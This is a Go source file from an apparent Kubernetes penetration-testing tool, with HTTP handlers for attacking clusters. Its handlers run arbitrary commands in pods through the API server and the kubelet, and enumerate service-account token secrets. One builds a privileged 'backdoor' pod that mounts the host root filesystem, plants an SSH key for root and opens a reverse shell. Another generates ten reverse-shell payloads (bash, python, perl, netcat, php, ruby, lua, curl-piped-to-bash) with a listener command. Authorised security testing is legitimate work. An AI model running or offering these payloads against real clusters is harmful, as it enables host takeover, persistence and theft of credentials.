package handler

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/trymonoly/K8sPenTool-ng/internal/kubectl"
	"github.com/trymonoly/K8sPenTool-ng/internal/util"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"sigs.k8s.io/yaml"
)

func buildK8sClient(targetHost, token, username, password string, skipTLS bool) (*kubectl.Client, error) {
	return kubectl.NewTargetClient(targetHost, token, username, password, skipTLS)
}

type PortForwardSession struct {
	ID         string    `json:"id"`
	TargetHost string    `json:"target_host"`
	Namespace  string    `json:"namespace"`
	PodName    string    `json:"pod_name"`
	LocalPort  int       `json:"local_port"`
	PodPort    int       `json:"pod_port"`
	StartedAt  time.Time `json:"started_at"`
}

type portForwardSessionState struct {
	PortForwardSession
	stopCh chan struct{}
}

type PortForwardManager struct {
	mu       sync.RWMutex
	sessions map[string]*portForwardSessionState
}

func NewPortForwardManager() *PortForwardManager {
	return &PortForwardManager{sessions: make(map[string]*portForwardSessionState)}
}

func (m *PortForwardManager) Add(s *portForwardSessionState) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.sessions[s.ID] = s
}

func (m *PortForwardManager) List() []PortForwardSession {
	m.mu.RLock()
	defer m.mu.RUnlock()
	result := make([]PortForwardSession, 0, len(m.sessions))
	for _, s := range m.sessions {
		result = append(result, s.PortForwardSession)
	}
	return result
}

func (m *PortForwardManager) Stop(id string) (PortForwardSession, bool) {
	m.mu.Lock()
	defer m.mu.Unlock()
	s, ok := m.sessions[id]
	if !ok {
		return PortForwardSession{}, false
	}
	delete(m.sessions, id)
	close(s.stopCh)
	return s.PortForwardSession, true
}

type ExecHandler struct {
	portForwards *PortForwardManager
}

func NewExecHandler() *ExecHandler {
	return &ExecHandler{portForwards: NewPortForwardManager()}
}

// APIServer exec
func (h *ExecHandler) APIListPods(c *gin.Context) {
	var req struct {
		TargetHost string `json:"target_host" binding:"required"`
		Namespace  string `json:"namespace"`
		Token      string `json:"token"`
		Username   string `json:"username"`
		Password   string `json:"password"`
		TimeoutSec int    `json:"timeout_sec"`
		SkipTLS    bool   `json:"skip_tls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 10
	}

	client, err := buildK8sClient(req.TargetHost, req.Token, req.Username, req.Password, req.SkipTLS)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	ctx, cancel := context.WithTimeout(c.Request.Context(), time.Duration(req.TimeoutSec)*time.Second)
	defer cancel()

	pods, err := client.ListPods(ctx, req.Namespace)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	// 返回结构化 pods，复用 kubectl_handler 的扁平化逻辑
	result := make([]gin.H, 0, len(pods.Items))
	for _, p := range pods.Items {
		containers := make([]string, 0)
		images := make([]string, 0)
		for _, c := range p.Spec.Containers {
			containers = append(containers, c.Name)
			images = append(images, c.Image)
		}
		result = append(result, gin.H{
			"namespace": p.Namespace, "name": p.Name, "status": string(p.Status.Phase),
			"node": p.Spec.NodeName, "ip": p.Status.PodIP,
			"containers": strings.Join(containers, ", "), "images": strings.Join(images, ", "),
		})
	}
	c.JSON(http.StatusOK, gin.H{"pods": result, "total": len(result), "source": "api-server"})
}

func (h *ExecHandler) APIExecInPod(c *gin.Context) {
	var req struct {
		TargetHost    string `json:"target_host" binding:"required"`
		Namespace     string `json:"namespace"`
		PodName       string `json:"pod_name" binding:"required"`
		ContainerName string `json:"container_name"`
		Command       string `json:"command" binding:"required"`
		Token         string `json:"token"`
		Username      string `json:"username"`
		Password      string `json:"password"`
		TimeoutSec    int    `json:"timeout_sec"`
		SkipTLS       bool   `json:"skip_tls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.Namespace == "" {
		req.Namespace = "default"
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 10
	}

	client, err := buildK8sClient(req.TargetHost, req.Token, req.Username, req.Password, req.SkipTLS)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	ctx, cancel := context.WithTimeout(c.Request.Context(), time.Duration(req.TimeoutSec)*time.Second)
	defer cancel()

	result, err := client.ExecInPodResult(ctx, req.Namespace, req.PodName, req.ContainerName, []string{"sh", "-c", req.Command})
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	output := result.Stdout
	if result.Stderr != "" {
		output += "\n[stderr]\n" + result.Stderr
	}
	c.JSON(http.StatusOK, gin.H{"output": output, "command": fmt.Sprintf("exec %s/%s -c %s -- %s", req.Namespace, req.PodName, req.ContainerName, req.Command)})
}

func (h *ExecHandler) EnumSATokens(c *gin.Context) {
	var req struct {
		TargetHost string `json:"target_host" binding:"required"`
		Namespace  string `json:"namespace"`
		Token      string `json:"token"`
		Username   string `json:"username"`
		Password   string `json:"password"`
		TimeoutSec int    `json:"timeout_sec"`
		SkipTLS    bool   `json:"skip_tls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 10
	}

	url := kubectl.APIServerURL(req.TargetHost) + "/api/v1/secrets"
	if req.Namespace != "" {
		url = fmt.Sprintf("%s/api/v1/namespaces/%s/secrets", kubectl.APIServerURL(req.TargetHost), req.Namespace)
	}
	// Add fieldSelector for SA tokens
	url += "?fieldSelector=type=kubernetes.io/service-account-token"

	code, body, err := util.SendRequestWithAuth(url, "GET", req.Token, req.Username, req.Password, req.TimeoutSec, req.SkipTLS)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"status_code": code, "body": util.FormatResponse(code, body), "url": url})
}

// Kubelet exec
func (h *ExecHandler) KubeletListPods(c *gin.Context) {
	var req struct {
		TargetHost string `json:"target_host" binding:"required"`
		Token      string `json:"token"`
		Username   string `json:"username"`
		Password   string `json:"password"`
		TimeoutSec int    `json:"timeout_sec"`
		SkipTLS    bool   `json:"skip_tls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 10
	}
	url := kubectl.TargetServiceURL(req.TargetHost, "https", 10250, "/pods")
	code, body, err := util.SendRequestWithAuth(url, "GET", req.Token, req.Username, req.Password, req.TimeoutSec, req.SkipTLS)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	if code != http.StatusOK {
		c.JSON(http.StatusOK, gin.H{
			"error":       fmt.Sprintf("Kubelet list pods failed: HTTP %d", code),
			"status_code": code,
			"body":        util.FormatResponse(code, body),
		})
		return
	}

	items, parseErr := parseKubeletPodList(body)
	if parseErr != nil {
		c.JSON(http.StatusOK, gin.H{
			"error":       parseErr.Error(),
			"status_code": code,
			"body":        util.FormatResponse(code, body),
		})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"pods":        flattenKubeletPods(items),
		"total":       len(items),
		"status_code": code,
		"source":      "kubelet",
	})
}

func (h *ExecHandler) KubeletExec(c *gin.Context) {
	var req struct {
		TargetHost    string `json:"target_host" binding:"required"`
		Namespace     string `json:"namespace"`
		PodName       string `json:"pod_name" binding:"required"`
		ContainerName string `json:"container_name"`
		Command       string `json:"command" binding:"required"`
		Token         string `json:"token"`
		Username      string `json:"username"`
		Password      string `json:"password"`
		TimeoutSec    int    `json:"timeout_sec"`
		SkipTLS       bool   `json:"skip_tls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.Namespace == "" {
		req.Namespace = "default"
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 10
	}
	url := kubectl.TargetServiceURL(req.TargetHost, "https", 10250, fmt.Sprintf("/run/%s/%s", req.Namespace, req.PodName))
	if req.ContainerName != "" {
		url += "/" + req.ContainerName
	}
	code, body, err := util.SendPostWithAuth(url, encodeKubeletCommandForm(req.Command),
		"application/x-www-form-urlencoded", req.Token, req.Username, req.Password, req.TimeoutSec, req.SkipTLS)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"status_code": code, "body": util.FormatResponse(code, body)})
}

// Backdoor Pod
type BackdoorConfig struct {
	Namespace string `json:"namespace"`
	Image     string `json:"image"`
	MountPath string `json:"mount_path"`
	NodeName  string `json:"node_name"`
	LHost     string `json:"lhost"`
	LPort     string `json:"lport"`
	PodName   string `json:"pod_name"`
	SSHKey    string `json:"ssh_pub_key"`
}

func (h *ExecHandler) GenerateBackdoorYAML(c *gin.Context) {
	var req BackdoorConfig
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.Image == "" {
		req.Image = "ubuntu:latest"
	}
	if req.Namespace == "" {
		req.Namespace = "default"
	}
	if req.MountPath == "" {
		req.MountPath = "/mnt"
	}
	if req.PodName == "" {
		req.PodName = "backdoor-pod"
	}
	yaml := generateBackdoorYAML(req)
	c.JSON(http.StatusOK, gin.H{"yaml": yaml})
}

func generateBackdoorYAML(cfg BackdoorConfig) string {
	setupSteps := make([]string, 0, 3)
	if cfg.SSHKey != "" {
		setupSteps = append(setupSteps,
			fmt.Sprintf("mkdir -p %s/root/.ssh", cfg.MountPath),
			fmt.Sprintf("printf '%%s\\n' '%s' >> %s/root/.ssh/authorized_keys", cfg.SSHKey, cfg.MountPath),
			fmt.Sprintf("chmod 600 %s/root/.ssh/authorized_keys", cfg.MountPath),
		)
	}
	if cfg.LHost != "" && cfg.LPort != "" {
		setupSteps = append(setupSteps, fmt.Sprintf("/bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1' &", cfg.LHost, cfg.LPort))
	}
	setupSteps = append(setupSteps, "while true; do sleep 3600; done")

	privileged := true
	hostPathType := corev1.HostPathDirectory
	pod := &corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      cfg.PodName,
			Namespace: cfg.Namespace,
			Labels:    map[string]string{"app": "backdoor"},
		},
		Spec: corev1.PodSpec{
			HostPID:     true,
			HostNetwork: true,
			NodeName:    cfg.NodeName,
			Containers: []corev1.Container{{
				Name:    "backdoor",
				Image:   cfg.Image,
				Command: []string{"/bin/sh"},
				Args:    []string{"-c", strings.Join(setupSteps, " && ")},
				SecurityContext: &corev1.SecurityContext{
					Privileged: &privileged,
				},
				VolumeMounts: []corev1.VolumeMount{{
					Name:      "host-root",
					MountPath: cfg.MountPath,
				}},
			}},
			Volumes: []corev1.Volume{{
				Name: "host-root",
				VolumeSource: corev1.VolumeSource{
					HostPath: &corev1.HostPathVolumeSource{
						Path: "/",
						Type: &hostPathType,
					},
				},
			}},
		},
	}

	body, err := yaml.Marshal(pod)
	if err != nil {
		return fmt.Sprintf("marshal backdoor pod yaml: %v", err)
	}
	return string(body)
}

// RBAC
func (h *ExecHandler) CheckRBAC(c *gin.Context) {
	var req struct {
		TargetHost string `json:"target_host" binding:"required"`
		Token      string `json:"token"`
		Username   string `json:"username"`
		Password   string `json:"password"`
		TimeoutSec int    `json:"timeout_sec"`
		SkipTLS    bool   `json:"skip_tls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	client, err := buildK8sClient(req.TargetHost, req.Token, req.Username, req.Password, req.SkipTLS)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	ctx, cancel := context.WithTimeout(c.Request.Context(), 10*time.Second)
	defer cancel()
	resources := []string{"pods", "secrets", "services", "deployments", "nodes", "serviceaccounts", "clusterrolebindings", "namespaces", "configmaps", "cronjobs", "daemonsets"}
	verbs := []string{"get", "list", "create", "delete", "update"}
	perms := make([]gin.H, 0)
	for _, r := range resources {
		allowed := make([]string, 0)
		for _, v := range verbs {
			ok, _ := client.CheckSelfPermissions(ctx, "", v, r)
			if ok {
				allowed = append(allowed, v)
			}
		}
		perms = append(perms, gin.H{"resource": r, "verbs": allowed})
	}
	canAll, _ := client.CheckSelfPermissions(ctx, "", "*", "*")
	c.JSON(http.StatusOK, gin.H{"permissions": perms, "is_admin": canAll})
}

// Reverse Shell - 10 types matching Java K8sPenTool
func (h *ExecHandler) GenerateRevShell(c *gin.Context) {
	var req struct {
		LHost string `json:"lhost" binding:"required"`
		LPort string `json:"lport" binding:"required"`
		Type  string `json:"type"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	req.Type = normalizeReverseShellType(req.Type)

	payloads := map[string]string{
		"bash-i":    fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", req.LHost, req.LPort),
		"bash":      fmt.Sprintf("bash -c 'sh -i >& /dev/tcp/%s/%s 0>&1'", req.LHost, req.LPort),
		"python":    fmt.Sprintf("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", req.LHost, req.LPort),
		"perl":      fmt.Sprintf("perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", req.LHost, req.LPort),
		"nc-e":      fmt.Sprintf("nc -e /bin/sh %s %s", req.LHost, req.LPort),
		"nc-mkfifo": fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f", req.LHost, req.LPort),
		"php":       fmt.Sprintf("php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", req.LHost, req.LPort),
		"ruby":      fmt.Sprintf("ruby -rsocket -e'f=TCPSocket.open(\"%s\",%s).to_i;exec sprintf(\"/bin/sh -i <&%%d >&%%d 2>&%%d\",f,f,f)'", req.LHost, req.LPort),
		"lua":       fmt.Sprintf("lua -e \"require('socket');require('os');t=socket.tcp();t:connect('%s','%s');os.execute('/bin/sh -i <&3 >&3 2>&3');\"", req.LHost, req.LPort),
		"curl":      fmt.Sprintf("# Step 1: On attacker host: echo 'bash -i >& /dev/tcp/%s/%s 0>&1' > shell.sh && python3 -m http.server 80\n# Step 2: On target: curl http://%s/shell.sh | bash", req.LHost, req.LPort, req.LHost),
	}
	payload, ok := payloads[req.Type]
	if !ok {
		req.Type = "bash-i"
		payload = payloads["bash-i"]
	}

	listenerCmd := fmt.Sprintf("nc -lvnp %s", req.LPort)
	c.JSON(http.StatusOK, gin.H{
		"type":      req.Type,
		"payload":   payload,
		"listener":  listenerCmd,
		"all_types": []string{"bash-i", "bash", "python", "perl", "nc-e", "nc-mkfifo", "php", "ruby", "lua", "curl"},
	})
}

func normalizeReverseShellType(shellType string) string {
	switch shellType {
	case "", "default":
		return "bash-i"
	case "nc":
		return "nc-mkfifo"
	default:
		return shellType
	}
}

// ==================== File Upload to Pod (kubectl cp) ====================

func (h *ExecHandler) UploadFile(c *gin.Context) {
	var req struct {
		TargetHost    string `json:"target_host" binding:"required"`
		Namespace     string `json:"namespace"`
		PodName       string `json:"pod_name" binding:"required"`
		ContainerName string `json:"container_name"`
		LocalPath     string `json:"local_path" binding:"required"`
		RemotePath    string `json:"remote_path" binding:"required"`
		Token         string `json:"token"`
		Username      string `json:"username"`
		Password      string `json:"password"`
		SkipTLS       bool   `json:"skip_tls"`
		TimeoutSec    int    `json:"timeout_sec"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.Namespace == "" {
		req.Namespace = "default"
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 30
	}

	client, err := buildK8sClient(req.TargetHost, req.Token, req.Username, req.Password, req.SkipTLS)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	ctx, cancel := context.WithTimeout(c.Request.Context(), time.Duration(req.TimeoutSec)*time.Second)
	defer cancel()

	result, err := client.UploadFile(ctx, req.Namespace, req.PodName, req.ContainerName, req.LocalPath, req.RemotePath)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error(), "output": result})
		return
	}
	c.JSON(http.StatusOK, gin.H{"output": result, "success": true})
}

// ==================== Port Forward ====================

func (h *ExecHandler) PortForwardInfo(c *gin.Context) {
	var req struct {
		TargetHost string `json:"target_host" binding:"required"`
		Namespace  string `json:"namespace"`
		PodName    string `json:"pod_name" binding:"required"`
		LocalPort  int    `json:"local_port"`
		PodPort    int    `json:"pod_port"`
		Token      string `json:"token"`
		Username   string `json:"username"`
		Password   string `json:"password"`
		SkipTLS    bool   `json:"skip_tls"`
		Preview    bool   `json:"preview"`
		TimeoutSec int    `json:"timeout_sec"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.Namespace == "" {
		req.Namespace = "default"
	}
	if req.PodPort == 0 {
		req.PodPort = 80
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 10
	}

	localPort := req.LocalPort
	if localPort == 0 {
		localPort = suggestLocalPort(req.PodPort)
	}
	command := fmt.Sprintf("kubectl port-forward -n %s pod/%s %d:%d", req.Namespace, req.PodName, localPort, req.PodPort)
	if req.Preview {
		c.JSON(http.StatusOK, gin.H{
			"command":              command,
			"namespace":            req.Namespace,
			"pod_name":             req.PodName,
			"pod_port":             req.PodPort,
			"suggested_local_port": localPort,
			"preview":              true,
			"hint":                 "Set preview=false or omit it to open a managed API-server port-forward session.",
		})
		return
	}

	client, err := buildK8sClient(req.TargetHost, req.Token, req.Username, req.Password, req.SkipTLS)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error(), "command": command})
		return
	}
	ctx, cancel := context.WithTimeout(c.Request.Context(), time.Duration(req.TimeoutSec)*time.Second)
	defer cancel()
	stopCh, err := client.PortForward(ctx, req.Namespace, req.PodName, localPort, req.PodPort)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error(), "command": command})
		return
	}
	session := &portForwardSessionState{
		PortForwardSession: PortForwardSession{
			ID:         fmt.Sprintf("pf-%d", time.Now().UnixNano()),
			TargetHost: req.TargetHost,
			Namespace:  req.Namespace,
			PodName:    req.PodName,
			LocalPort:  localPort,
			PodPort:    req.PodPort,
			StartedAt:  time.Now(),
		},
		stopCh: stopCh,
	}
	h.portForwards.Add(session)

	c.JSON(http.StatusOK, gin.H{
		"success":    true,
		"session":    session.PortForwardSession,
		"command":    command,
		"local_url":  fmt.Sprintf("http://127.0.0.1:%d", localPort),
		"stop_api":   fmt.Sprintf("DELETE /api/v1/exec/port-forward/%s", session.ID),
		"status_api": "GET /api/v1/exec/port-forward/sessions",
	})
}

func (h *ExecHandler) ListPortForwards(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"sessions": h.portForwards.List()})
}

func (h *ExecHandler) StopPortForward(c *gin.Context) {
	session, ok := h.portForwards.Stop(c.Param("id"))
	if !ok {
		c.JSON(http.StatusNotFound, gin.H{"error": "port-forward session not found"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"success": true, "session": session})
}

func suggestLocalPort(podPort int) int {
	candidate := podPort
	if candidate < 1024 {
		candidate += 8000
	}
	for port := candidate; port < candidate+100; port++ {
		if isPortAvailable(port) {
			return port
		}
	}
	return candidate
}

func isPortAvailable(port int) bool {
	ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", port))
	if err != nil {
		return false
	}
	_ = ln.Close()
	return true
}
